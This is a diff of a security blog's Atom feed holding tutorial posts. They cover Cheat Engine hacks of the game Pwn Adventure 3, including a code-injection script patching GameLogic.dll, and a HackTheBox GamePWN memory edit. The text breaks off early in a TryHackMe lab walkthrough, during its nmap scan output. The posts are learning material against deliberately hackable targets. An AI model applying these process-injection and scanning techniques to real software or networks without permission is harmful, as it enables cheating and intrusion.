@@ -1,4 +1,628 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-26T23:42:33+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rahul R</title><subtitle>Personal blog where I will be posting about security,CTFs and more</subtitle><author><name>Rahul R</name></author><entry><title type="html">From Multiple IDORs leading to Code Execution on a different Host Container</title><link href="http://localhost:4000/idor-to-rce/" rel="alternate" type="text/html" title="From Multiple IDORs leading to Code Execution on a different Host Container" /><published>2019-10-04T00:00:00+05:30</published><updated>2019-10-04T00:00:00+05:30</updated><id>http://localhost:4000/idor-to-rce</id><content type="html" xml:base="http://localhost:4000/idor-to-rce/">&lt;p&gt;Here is a short write-up on an interesting bug that I found while testing a Site there won’t be many screenshots of the bug as I can’t disclose any detail about the target.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-15T18:06:54+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rahul R</title><subtitle>Personal blog where I will be posting about security,CTFs and more</subtitle><author><name>Rahul R</name></author><entry><title type="html">Breaking Pwn Adventure 3 - Part 2(Speed Hack, SuperJump and Pointers Offline Mode)</title><link href="http://localhost:4000/Breaking-PWNAdventure3-Part2/" rel="alternate" type="text/html" title="Breaking Pwn Adventure 3 - Part 2(Speed Hack, SuperJump and Pointers Offline Mode)" /><published>2022-04-15T00:00:00+05:30</published><updated>2022-04-15T00:00:00+05:30</updated><id>http://localhost:4000/Breaking-PWNAdventure3-Part2</id><content type="html" xml:base="http://localhost:4000/Breaking-PWNAdventure3-Part2/">&lt;p&gt;In this part I will be explaining how to increase out player speed and our jump velocity  and finding pointers to these values to be persistant.&lt;/p&gt;
+
+&lt;h1 id=&quot;speed-hack--super-jump&quot;&gt;Speed Hack &amp;amp; Super Jump&lt;/h1&gt;
+&lt;p&gt;We can start by attaching our game to cheat engine and scaning for the health value of the player.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/scan1.PNG&quot; alt=&quot;&quot; /&gt;
+We have our health address and now we can  find what instruction writes to this address when we get damaged by an enemy for that we need to right click on the address and select &lt;strong&gt;Find out what writes to this address&lt;/strong&gt; or press &lt;strong&gt;F6&lt;/strong&gt; a small window will be shown and it will be populated once we start getting damage.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/writes2.PNG&quot; alt=&quot;&quot; /&gt;
+The instruction excecuted when getting damage is &lt;strong&gt;sub [edi+30],eax&lt;/strong&gt; so the address in EDI is the base address of the player and offset 30 is the place where our player’s health is stored. We can now click on that instruction to get more information and grab the address of EDI.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/healthEDI.PNG&quot; alt=&quot;&quot; /&gt;
+In my case my EDI address is 0x4EC76D78 no we can use this address to view the structure related with the player for that we need to go to the disassembler and click the tools  and select Dissect Data Structure.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/datastructure.PNG&quot; alt=&quot;&quot; /&gt;
+Normally in games the player or the enemy object’s data such as health,position,names are stored in structures with an offset so each time the tries to access some for example the player’s health all the game needs is the player’s base address and incrementing these offsets will reach the player’s health value.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;During Dissect Data Structure the base address should be used&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now we can add our players base address in the box labeled Group 1 and then click on structures and then Define a new structure.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/datastructure1.PNG&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/pwnadventure/partII/datastructure2.PNG&quot; alt=&quot;&quot; /&gt;
+We can verify this by going to offset 30 which contains our player’s health value.Generally variables such as speed are defined in the program as a constant value.
+Since this is the player structure the speed value has to be stored somewhere in this sturcture we can find it by moving down the structre and finding whole values such as 100 ,500.450 etc and changing it to a much higher value.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;This is not an efficent method as there are chances for our game to crash if we change a wrong structure value.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;At offset 190 there is a value of 200 we can add it to our address list and change it to a higher value and try moving in game.&lt;/p&gt;
+&lt;figure class=&quot;video_container&quot;&gt;
+  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
+    &lt;source src=&quot;/assets/images/pwnadventure/partII/speed.mp4&quot; type=&quot;video/mp4&quot; /&gt;
+  &lt;/video&gt;
+&lt;/figure&gt;
+&lt;p&gt;As we can see our player’s movement speed increased and we are zooming across the map.&lt;/p&gt;
+
+&lt;p&gt;For superjump we use the same method to find the offset where our jump velocity is stored in this game its stored right next to the player’s speed at offset 194 the default value is set to 420.Lets change it to a higher amount and try to jump.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/jump.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;figure class=&quot;video_container&quot;&gt;
+  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
+    &lt;source src=&quot;/assets/images/pwnadventure/partII/jump.mp4&quot; type=&quot;video/mp4&quot; /&gt;
+  &lt;/video&gt;
+&lt;/figure&gt;
+&lt;p&gt;Changing it to a higher value has made our player to jump much higher but there is one issue unlike the Gode Mode hack that was made in previous part this is not persistant which means that if we close the game this memory address will become invalid due to &lt;a href=&quot;https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR&quot;&gt;ASLR&lt;/a&gt; thats where pointers come in rescue.&lt;/p&gt;
+
+&lt;h1 id=&quot;pointers&quot;&gt;Pointers&lt;/h1&gt;
+&lt;p&gt;Due to ASLR when a game restarts the previous addresses that were used will become invalid in order for the game to find the correct address pointers are used some games use single level pointers which means only one offset will be present.
+Some games use multilevel pointers where there might be 5 or 6 levels of offsets.
+&lt;a href=&quot;https://guidedhacking.com/threads/understanding-pointers-how-to-find-pointers.14502/&quot;&gt;Guided hacking&lt;/a&gt; and &lt;a href=&quot;https://www.youtube.com/watch?v=elI6vZR6HGE&quot;&gt;LiveOverflow&lt;/a&gt; has made an incredible set of videos that tells about pointers and why this is used in development.&lt;/p&gt;
+
+&lt;p&gt;We can now start by doing a pointer scan on the player’s speed value by right clicking the value and selecting &lt;strong&gt;pointer scan for this address&lt;/strong&gt; and continue which will give out a list of pointers that points to our player speed address normally we can use this method but for this game even though we get pointers that will be invalid when we restart the game since all the logic is tied to the GameLogic.dll file for that we need to find the starting and ending address of the DLL and restrict our pointer scan within that address space for that we can go to the dissassembler and click on view then Memory Regions which will give a list of addresses that the game uses scrolling down we need to find the address where our GameLogic.dll is being loaded to memory.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/memory.PNG&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/pwnadventure/partII/memory1.PNG&quot; alt=&quot;&quot; /&gt;
+We can see that the GameLogic.dll file is loaded at address 67E90000 so we can use this information to restrict our pointer scan.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer.PNG&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer1.PNG&quot; alt=&quot;&quot; /&gt;
+This will scan for pointers to our player’s speed value within the DLL’s address space.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer2.PNG&quot; alt=&quot;&quot; /&gt;
+The pointer scan result shows more that 5000 potential pointer paths to verify this we just have to restart the game and attach it to cheat engine.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer3.PNG&quot; alt=&quot;&quot; /&gt;
+Reattaching the game to cheat engine and checking the pointer scan result we can see that the values are all gone since the previous address is no longer available we can now rescan this pointer map for the value of 200 and see if we have some valid pointers.
+&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer4.PNG&quot; alt=&quot;&quot; /&gt;
+Since we have restarted the game we need to find the player speed address again and copy the address and use that address to rescan for pointers.
+&lt;img src=&quot;assets/images/pwnadventure/partII/pointer5.PNG&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;assets/images/pwnadventure/partII/pointer6.png&quot; alt=&quot;&quot; /&gt;
+We can see that the result has just shrunk to 14 possible pointers we can add all or a couple to our address list and check if the value gets updated once we restart the game.
+&lt;img src=&quot;assets/images/pwnadventure/partII/pointer7.png&quot; alt=&quot;&quot; /&gt;
+We know that the player’s speed and jump velocity are apart by just 4 bytes we can add the last offset with 4 to get a pointer path to the jump velocity.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The cheat engine cheat table is available in my &lt;a href=&quot;https://github.com/rahulr311295/GameTrainers/blob/main/PwnAdventure3/CheatTable/PwnAdventure3.CT&quot;&gt;github&lt;/a&gt; if anyone wishes to try out.&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="reverse-engineering" /><category term="gamehacking" /><category term="cheatengine" /><summary type="html">Creating Speed Hack and Super Jump on Pwn Adventure 3 using Cheat Engine</summary></entry><entry><title type="html">Breaking Pwn Adventure 3 - Part 1(God Mode + One Hit Kills Offline Mode)</title><link href="http://localhost:4000/Breaking-PWNAdventure3-Part1/" rel="alternate" type="text/html" title="Breaking Pwn Adventure 3 - Part 1(God Mode + One Hit Kills Offline Mode)" /><published>2022-04-09T00:00:00+05:30</published><updated>2022-04-09T00:00:00+05:30</updated><id>http://localhost:4000/Breaking-PWNAdventure3-Part1</id><content type="html" xml:base="http://localhost:4000/Breaking-PWNAdventure3-Part1/">&lt;h1 id=&quot;prologue&quot;&gt;Prologue&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnadventure/logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Readers can ignore this if required&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ever since the awesome &lt;a href=&quot;https://twitter.com/LiveOverflow&quot;&gt;LiveOverflow&lt;/a&gt; released his game hacking &lt;a href=&quot;https://www.youtube.com/playlist?list=PLhixgUqwRTjzzBeFSHXrw9DnQtssdAwgG&quot;&gt;playlist&lt;/a&gt;. I always wanted to try it out myself figuring out how things worked eventhough I have zero skill in reading assembly, reverse engineering or even writing code.&lt;/p&gt;
+
+&lt;p&gt;Game Hacking is no easy job it requires time , many hours of trial and error , crashing and I have to admire the efforts put by LiveOverflow in creating his Game Hacking series. I had my fare share of Game Hacking in my teen years which was the first time I used &lt;a href=&quot;https://www.cheatengine.org/&quot;&gt;Cheat Engine&lt;/a&gt; to change the current amount of in game money that I had in GTA Vice City. I’ve only used it once without knowing the potential that tool had&lt;/p&gt;
+
+&lt;p&gt;Since  I consider this as a learning experience I thought of posting my journey here as a journal.&lt;/p&gt;
+
+&lt;h1 id=&quot;god-mode-and-one-hit-kills&quot;&gt;God Mode and One Hit Kills&lt;/h1&gt;
+&lt;p&gt;To start our hacks we need to attach the game process by opening Cheat Engine and attaching the game.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/processattach.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next we need to confirm what value we need to find in this case Im going after the Health Value.For that lets start a scan by setting the Scan Type to &lt;strong&gt;Exact Value&lt;/strong&gt; and the Value Type as &lt;strong&gt;4 Bytes&lt;/strong&gt; since the Health value is an interger and start a new scan.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Note : Some games also use float value type for Health , Ammo etc&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnadventure/partI/scan1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have around 10K value we can futher refine by getting some damage from the enemies.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnadventure/partI/damage1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now our health has been reduced to 92 we can use that value to do the next scan.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/scan1.PNG&quot; alt=&quot;&quot; /&gt;
+We have now 43 potential memory addresses that has our health value all 43 of the address will change we can isolate the correct address by add all 43 of the memory addresses to our address list and freezing a couple of the address and taking damage.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/freeze.gif&quot; alt=&quot;&quot; /&gt;
+We can see that our health keeps going back to 100 everytime we get damage we can further verify this by changing the value to something high.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/freeze.PNG&quot; alt=&quot;&quot; /&gt;
+By selecting 3 of the address and changing the value to 1337 the first and the last value changed so one of these address is the address that stores our health.We can  now isolate those 2 memory address and change the value one by one until we find the right address.&lt;/p&gt;
+
+&lt;p&gt;To implement God Mode we need to find what instruction writes to this address when we get damaged by an enemy for that we need to right click on the address and select &lt;strong&gt;Find out what writes to this address&lt;/strong&gt; or press &lt;strong&gt;F6&lt;/strong&gt; a small window will be shown and it will be populated once we start getting damage.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnadventure/partI/writestoaddress.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now take damage from an enemy and our empty box gets filled with an instruction &lt;strong&gt;sub [edi+30],eax&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/pwnadventure/partI/writestoaddress1.PNG&quot; alt=&quot;&quot; /&gt;
+We can now investigate what are the values stored in the register by clicking on it and looking in the bottom window.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/writestoaddress2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So the register EAX containes the value 8 which is the damage done by the Giant Rats on a single hit which is then subtracted from value stored in EDI + 30 where EDI is the base address and 30 is an offset.
+Since our goal is to acheive God Mode we could just NOP out this instruction so that when ever we get hit our health wont be subtracted.
+We can do that by click the &lt;strong&gt;Show disassembler&lt;/strong&gt; button which will show a disassembler similar to OllyDBG or Immunity Debugger.&lt;/p&gt;
+
+&lt;p&gt;We can now right click on the sub instruction and click on &lt;strong&gt;Replace with code that does nothing&lt;/strong&gt; which will replace the SUB instruction with NOPs.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/nop.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnadventure/partI/nop1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have nopped the instrustion we can check it by getting some damage from an enemy.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/nop2.gif&quot; alt=&quot;&quot; /&gt;
+Our health is not changing but there is one issue if we shoot an enemy with our fireball the enemy doesnot take damage as well.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/nop3.gif&quot; alt=&quot;&quot; /&gt;
+This is due to some thing called &lt;a href=&quot;https://guidedhacking.com/threads/cheat-engine-shared-opcode-tutorial-gh203.18815/&quot;&gt;&lt;strong&gt;Shared OP Codes&lt;/strong&gt;&lt;/a&gt; which means that the instruction  &lt;strong&gt;sub [edi+30],eax&lt;/strong&gt; is shared with our player and enemies so if we change these OP Codes it will reflect on both the player and the enemy, So we need to find a value or an offset that can be used to create a comparison between our player and the enemies.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Dont forget to restore the nopped instruction&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Fo that we need to right click on the &lt;strong&gt;sub [edi+30],eax&lt;/strong&gt; from what writes to this address box and click on &lt;strong&gt;Find out what addresses this code accesses&lt;/strong&gt; which will bing a second window.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/pVeaccess.PNG&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/pwnadventure/partI/pVeaccess1.PNG&quot; alt=&quot;&quot; /&gt;
+Now we need to take a hit from an enemy and give a hit to a couple of the enemies as well.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/pVeaccess2.gif&quot; alt=&quot;&quot; /&gt;
+We can see that we have some entries when we get hit and give out damage we can select a couple of these values and right click and select &lt;strong&gt;Open disect data with selected addesses&lt;/strong&gt;.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/pVedisect.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which brings another window with our addresses we need to create a group for our enemies for comparison&lt;/p&gt;
+&lt;figure class=&quot;video_container&quot;&gt;
+  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
+    &lt;source src=&quot;/assets/images/pwnadventure/partI/pVesturct.mp4&quot; type=&quot;video/mp4&quot; /&gt;
+  &lt;/video&gt;
+&lt;/figure&gt;
+&lt;p&gt;In this sturcture we can check for a certain value that differs the player from other characters that wont be changed during the entire game the items in orange shows entries that are different in both groups in this case the offset 14 contains the name of the Actor.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/pVesturct.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can  use this offset to create a comparrison much like an if statement so that our cheat only affects on the enemie’s health.
+Lets begin our cheat development by going back to the disassembler and selecting the SUB instruction and clicking on the Tools menu and then selecting the Auto Assemble option. 
+There are multiple ways we can inject custom code to a game’s process I’ve used code injection method for creating this cheat.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/inject.PNG&quot; alt=&quot;&quot; /&gt;
+A new editable window will be displayed where we can select the method of injection from the templates menu.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/inject1.PNG&quot; alt=&quot;&quot; /&gt;
+All our custom code should be kept inside the newmem section. Now we can start by doing a comparison for our God Mode.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ENABLE]
+//code from here to &apos;[DISABLE]&apos; will be used to enable the cheat
+alloc(newmem,2048)
+label(returnhere)
+label(originalcode)
+label(exit)
+
+newmem: //this is allocated memory, you have read,write,execute access
+
+cmp  dword ptr [edi+14],&apos;Player&apos; // Compares if the value in EDI+14 is the string player since EDI is our player&apos;s base address.
+
+jne originalcode //if its not player move to original code
+
+sub [edi+30],0 //If offset value is equal to player subtract 0 from health
+
+push [edi+30] 
+
+jmp exit // Above operations done exiting from this execution flow This should be done else our code starts going into original code and sets our health to 0 as well if we get hit from an enemy
+
+originalcode:
+mov [edi+30],0 // Move 0 to Total Health (Only affects Enemies)
+push [edi+30]
+
+exit:
+jmp returnhere
+
+&quot;GameLogic.dll&quot;+20C5:
+jmp newmem
+nop
+returnhere:
+
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+dealloc(newmem)
+&quot;GameLogic.dll&quot;+20C5:
+sub [edi+30],eax
+push [edi+30]
+//Alt: db 29 47 30 FF 77 30
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Lets now assign this cheat to our cheat table by going to File and selecting the assign to cheat table.
+&lt;img src=&quot;/assets/images/pwnadventure/partI/cheat.PNG&quot; alt=&quot;&quot; /&gt;
+Now we can test our cheat see weather we are taking in damage and killing enemies in one hit.&lt;/p&gt;
+&lt;figure class=&quot;video_container&quot;&gt;
+  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
+    &lt;source src=&quot;/assets/images/pwnadventure/partI/godmode.mp4&quot; type=&quot;video/mp4&quot; /&gt;
+  &lt;/video&gt;
+&lt;/figure&gt;
+&lt;p&gt;Lets try it out on a Boss and see if this cheat works or not for that lets go to Magmarok and try killing him in one hit.&lt;/p&gt;
+&lt;figure class=&quot;video_container&quot;&gt;
+  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
+    &lt;source src=&quot;/assets/images/pwnadventure/partI/boss.mp4&quot; type=&quot;video/mp4&quot; /&gt;
+  &lt;/video&gt;
+&lt;/figure&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="reverse-engineering" /><category term="gamehacking" /><category term="cheatengine" /><summary type="html">Creating God Mode and One Hit Kills on Pwn Adventure 3 using Cheat Engine</summary></entry><entry><title type="html">Hackthebox GamePWN CubeMadness1</title><link href="http://localhost:4000/HackTheBox-GamePWN/" rel="alternate" type="text/html" title="Hackthebox GamePWN CubeMadness1" /><published>2022-04-04T00:00:00+05:30</published><updated>2022-04-04T00:00:00+05:30</updated><id>http://localhost:4000/HackTheBox-GamePWN</id><content type="html" xml:base="http://localhost:4000/HackTheBox-GamePWN/">&lt;p&gt;While searching through hackthebox I came across a new challenge category called GamePWN which was related to game hacking so I thought why don’t I give it a try on something new.
+So I downloaded the zip file and extracted it which contained the game binary which was developed in Unity Engine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/files.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Most unity games are developed with C# which can be de-compiled directly using &lt;a href=&quot;https://github.com/dnSpy/dnSpy&quot;&gt;dnSpy&lt;/a&gt; by dropping the executable or the GameAssembly.dll file,But in this case the game assembly was actually build with &lt;a href=&quot;https://docs.unity3d.com/Manual/IL2CPP.html&quot;&gt;il2cpp&lt;/a&gt; which converts C# code to C++ which is actually used by developers to stop reverse engineering and leaking their game’s source code.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/dnspy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are tools such as &lt;a href=&quot;https://github.com/djkaty/Il2CppInspector&quot;&gt;Il2CppInspector&lt;/a&gt; and &lt;a href=&quot;https://github.com/Perfare/Il2CppDumper&quot;&gt;Il2CppDumper&lt;/a&gt; that can be used to convert the DLL to a somewhat readable form.
+But this challenge wont require such drastic measures all we need is good old &lt;a href=&quot;https://www.cheatengine.org/&quot;&gt;CheatEngine&lt;/a&gt; which is an OP tool used by game hackers or reverse engineers to edit game memory on the fly.
+Our end goal of this challenge is to collect 20 cubes inorder to win but the game only has 6 cubes&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/teaser.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we need to change the current value of our collected cubes to 20 inorder to read the flag for that we need to start the game and then attach the game’s process to CheatEngine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have attached our game’s process to CheatEngine, Now we need to find the memory address where the current score is stored.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Usually in the development phase of a game values such as Health,Ammo,XP,Score are stored in 4 byte integer values so we can start our initial scan by setting the Scan Type to Exact Values and the Value Type as 4 Bytes and search for the value 0 which is our current score.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see in the above image we have a huge list of addresses where our initial value is zero we can now narrow it down by collecting a single cube in the game and then changing the Scan Type to Increased By and setting the value as 1 since we collected a cube and clicking the Next Scan button.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now our address values have dropped down to around 37 thousand we can use the same method to further filter the memory addresses.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now our address values have dropped even more to just 3 thousand occurances.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Generally in a game there are certain memory locations that keeps changing every tick(seconds) we can filter that out by changing the Scan Type to Unchanged Values.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By following the same method by collecting a couple of cubes and then using that value to do an increased by value scan we will end up with 3 or 4 memory addresses.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now double click on those memory addresses which will be added to our address list below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can select the memory addresses one by one and change the value to check weather it is the correct memory address.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/cheatengine.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that we have found the memory address where the score is being stored now we can read the flag by changing the score to 20 or above.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/gamepwn-cubemadness/win.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Also I will be posting more on GameHacking in this website most of them will be offline hacks and some online hacks such as ESP and AimBots.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="hackthebox" /><category term="gamehacking" /><category term="cheatengine" /><summary type="html">This is the walkthrough for the newly introduced challenge category GamePWN on HackTheBox</summary></entry><entry><title type="html">Tryhackme Ra Walkthrough</title><link href="http://localhost:4000/Ra-Tryhackme-Walkthrough/" rel="alternate" type="text/html" title="Tryhackme Ra Walkthrough" /><published>2022-02-11T00:00:00+05:30</published><updated>2022-02-11T00:00:00+05:30</updated><id>http://localhost:4000/Ra-Tryhackme-Walkthrough</id><content type="html" xml:base="http://localhost:4000/Ra-Tryhackme-Walkthrough/">&lt;h2 id=&quot;story&quot;&gt;Story&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
+
+Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?
+
+Happy Hacking!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;A Nmap  full scan shows multiple open ports running different services one of then that stands out is port &lt;strong&gt;80&lt;/strong&gt; which is a webserver also in the nmap output there is a domain name which can be added to out hosts file.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Sun Feb  6 11:21:06 2022 as: nmap -sC -sV -Pn -p- -oN initial 10.10.85.15&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.85.15
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.21s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65499 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE SERVICE             VERSION
+53/tcp    open  domain              Simple DNS Plus
+80/tcp    open  http                Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Windcorp.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec        Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-02-06 06:10:15Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc               Microsoft Windows RPC
+139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp   open  ldap                Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: windcorp.thm0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+2179/tcp  open  vmrdp?
+3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: windcorp.thm0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
